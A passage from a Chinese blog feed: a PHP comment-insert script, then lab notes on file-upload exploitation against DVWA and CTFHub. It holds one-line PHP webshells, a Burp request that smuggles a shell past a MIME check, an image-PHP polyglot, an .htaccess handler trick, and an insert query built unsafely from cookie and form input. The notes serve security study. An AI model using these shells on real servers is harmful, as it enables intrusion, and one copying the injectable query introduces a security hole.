class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败：&quot;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$comment</span> = <span class="variable">$_POST</span>[<span class="string">&quot;comment&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into u_c&quot;</span>.<span class="string">&quot;(username, comment)&quot;</span>.<span class="string">&quot;values&quot;</span>.<span class="string">&quot;(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$comment</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>,<span class="string">&#x27;commentDB&#x27;</span>);<span class="comment">//选择数据库</span></span><br><span class="line"><span class="variable">$retval</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);<span class="comment">//执行插入语句</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$retval</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;插入数据失败:&#x27;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;留言成功！&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);<span class="comment">//关闭数据库连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;//在Ubuntu环境下后端用MySQL，前端用HTML和PHP&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo su	//进入根目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mysql -uroot -p123456	//进入MySQL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;数据库和文件一定要在同一主机，并且将文件放在/var/www/html下，打开文件要走apache，即要在URL上输入路径，不能直接打开本地的html文件。&lt;/p&gt;</summary>
    
    
    
    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="MySQL" scheme="http://example.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Web渗透</title>
    <link href="http://example.com/posts/54924480.html"/>
    <id>http://example.com/posts/54924480.html</id>
    <published>2022-04-05T01:29:27.972Z</published>
    <updated>2022-04-11T05:27:15.227Z</updated>
    
    <content type="html"><![CDATA[<p>文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。</p><p>总实验准备：</p><p>kali虚拟机、OWASPBWA靶机、win10、XShell</p><span id="more"></span><h1 id="1-文件上传漏洞"><a href="#1-文件上传漏洞" class="headerlink" title="1. 文件上传漏洞"></a>1. 文件上传漏洞</h1><h2 id="1-1-文件上传漏洞-低"><a href="#1-1-文件上传漏洞-低" class="headerlink" title="1.1 文件上传漏洞[低]"></a>1.1 文件上传漏洞[低]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一句话木马，中国菜刀</span><br></pre></td></tr></table></figure><p>靶机一定要用NAT连接，桥接方式不安全。因为用靶机复制不了不方便做笔记，所以我用XShell将靶机终端连接在物理机上。查看靶机的IP地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@owaspbwa:~# dhclient eth0</span><br><span class="line">There is already a pid file /var/run/dhclient.pid with pid 2890</span><br><span class="line">killed old client process, removed PID file</span><br><span class="line">Internet Systems Consortium DHCP Client V3.1.3</span><br><span class="line">Copyright 2004-2009 Internet Systems Consortium.</span><br><span class="line">All rights reserved.</span><br><span class="line">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class="line"></span><br><span class="line">Listening on LPF/eth0/00:0c:29:40:b1:22</span><br><span class="line">Sending on   LPF/eth0/00:0c:29:40:b1:22</span><br><span class="line">Sending on   Socket/fallback</span><br><span class="line">DHCPREQUEST of 192.168.137.146 on eth0 to 255.255.255.255 port 67</span><br><span class="line">DHCPACK of 192.168.137.146 from 192.168.137.254</span><br><span class="line">bound to 192.168.137.146 -- renewal in 685 seconds.</span><br></pre></td></tr></table></figure><p>在物理机输入靶机的IP地址<strong>192.168.137.146</strong>，在选项中找到Damn Vulnerable Web Application进入，用户名和密码均为admin。在左侧找到upload，可以试着选择文件上传，但文件大小不能过大，否则上传失败。在右下角处查看后端源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码告诉我们上传的文件没有限制是图片，并且它保存的路径在当前目录的/hackable/uploads上。我们将一句话木马shell1.php文件上传到系统中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;caidao&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打开中国菜刀，右键添加地址：<a href="http://192.167.137.146/dvwa/hackable/uploads/shell1.php，后面小框填$_POST[]中的内容，即caidao。选中地址右键就可以开始搞事情了。">http://192.167.137.146/dvwa/hackable/uploads/shell1.php，后面小框填$_POST[]中的内容，即caidao。选中地址右键就可以开始搞事情了。</a></p><p>在菜刀中添加地址的下面有个配置框，如果知道系统的数据库密码，还可以查看系统的数据库。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>loaclhost<span class="tag">&lt;/<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>root<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>owaspbwa<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="1-2-文件上传漏洞-中"><a href="#1-2-文件上传漏洞-中" class="headerlink" title="1.2 文件上传漏洞[中]"></a>1.2 文件上传漏洞[中]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BurpSuite，一句话木马，中国菜刀</span><br></pre></td></tr></table></figure><p>在左侧DVWA Security可以选择安全性，这次选中级。</p><p>查看一下后端源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们发现多添加了一个条件判断，上传mime类型是image/jpeg，即只能上传后缀为.jpg和.jpeg的文件，并且文件大小要小于100000b。直接上传一句话木马shell1.php肯定是不行的。</p><p>先将之前放进uploads的所有文件删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@owaspbwa:~# cd /var/www/dvwa</span><br><span class="line">root@owaspbwa:/var/www/dvwa# ls</span><br><span class="line">about.php     docs         hackable          login.php    README.md     vulnerabilities</span><br><span class="line">CHANGELOG.md  dvwa         ids_log.php       logout.php   robots.txt</span><br><span class="line">config        external     index.php         phpinfo.php  security.php</span><br><span class="line">COPYING.txt   favicon.ico  instructions.php  php.ini      setup.php</span><br><span class="line">root@owaspbwa:/var/www/dvwa# cd hackable/uploads</span><br><span class="line">root@owaspbwa:/var/www/dvwa/hackable/uploads# ls</span><br><span class="line">dvwa_email.pngshell1.php</span><br><span class="line">root@owaspbwa:/var/www/dvwa/hackable/uploads# rm -rf *</span><br></pre></td></tr></table></figure><p>记住记住！！删除当前目录下所有文件的命令是<strong>rm -rf *</strong>，不是<strong>rm -rf /*</strong>，这是删库跑路！！血的教训…</p><p>所以我们要用到burpsuite，在火狐浏览器中设置为本地代理后，将发送一句话木马shell1.php的包进行拦截，将包中的Content-Type改为image/jpeg伪造成图片类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.137.146</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Length: 509</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.137.146</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.137.146/dvwa/vulnerabilities/upload/</span><br><span class="line"></span><br><span class="line">Cookie: security=medium; PHPSESSID=rdm26d89oh6rmfrfi1khqpkul7; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell1.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-php//改为image/jpeg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120--</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再发送出去，系统以为我们发送的是图片类型，但实际我们发送的是一句话木马，再用中国菜刀就可以了。</p><p>本来想用kali直接渗透，因为Kali本机就装有burp suite，所以很方便，但不会用kali的weevely——类似于中国菜刀的程序，故放弃。</p><p>在物理机装好burpsuite，弄好代理，就跟上述操作一样。</p><h2 id="1-3-文件上传漏洞-高"><a href="#1-3-文件上传漏洞-高" class="headerlink" title="1.3 文件上传漏洞[高]"></a>1.3 文件上传漏洞[高]</h2><p>查看后端源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPG&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpeg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPEG&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这次的条件判断语句是直接检查文件的后缀，上面两种方法都不行。那我们只能是上传图片，如果图片中含有木马，那我们也可以用中国菜刀拿下这个系统。</p><p>攻击方法要与文件包含漏洞[低]结合。</p><h2 id="1-4-一句话木马"><a href="#1-4-一句话木马" class="headerlink" title="1.4 一句话木马"></a>1.4 一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shell1.php</span><br><span class="line">&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">shell2.php</span><br><span class="line">&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">http://192.168.137.146/dvwa/hackable/uploads/shell2.php?cmd=system(&quot;pwd&quot;);</span><br><span class="line"></span><br><span class="line">shell3.php</span><br><span class="line">&lt;?php system($_REQUEST[&#x27;chopper&#x27;]);?&gt;</span><br><span class="line">http://192.168.137.146/dvwa/hackable/uploads/shell3.php?chopper=ls /</span><br><span class="line"></span><br><span class="line">shell4.jpg</span><br><span class="line">shell4.php</span><br><span class="line">&lt;?php fputs(fopen(&quot;shell4.php&quot;,&quot;w&quot;), &#x27;&lt;?php eval($_POST[caidao]);?&gt;&#x27;);?&gt;</span><br><span class="line">copy hello.jpg/b+shell4.php/a shell4.jpg</span><br><span class="line"></span><br><span class="line">shell5.phtml</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&#x27;caidao&#x27;]);&lt;/script&gt;</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;system(&#x27;cat /flag&#x27;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">shell6.php</span><br><span class="line">#加上图片文件头</span><br></pre></td></tr></table></figure><h2 id="1-5-weevly用法"><a href="#1-5-weevly用法" class="headerlink" title="1.5 weevly用法"></a>1.5 weevly用法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevly generate [password] [filename]生成一个木马文件</span><br><span class="line">weevly [url to file] [password]连接到服务器</span><br></pre></td></tr></table></figure><h2 id="1-6-htaccess"><a href="#1-6-htaccess" class="headerlink" title="1.6 .htaccess"></a>1.6 .htaccess</h2><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>构造.htaccess文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;sj&quot;&gt;</span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#FileMathch参数即为文件名的正则匹配，标签内的意思是将sj文件当成php文件解析</span><br></pre></td></tr></table></figure><p> 构造sj文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /var/www/html&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;cat /var/www/html/flag.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;find / -name flag&quot;</span>); <span class="meta">?&gt;</span><span class="comment">#这个不行</span></span><br></pre></td></tr></table></figure><h2 id="1-7-00截断"><a href="#1-7-00截断" class="headerlink" title="1.7 00截断"></a>1.7 00截断</h2><p>在url中%00表示ascii码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。</p><p>参考如下文章：<a 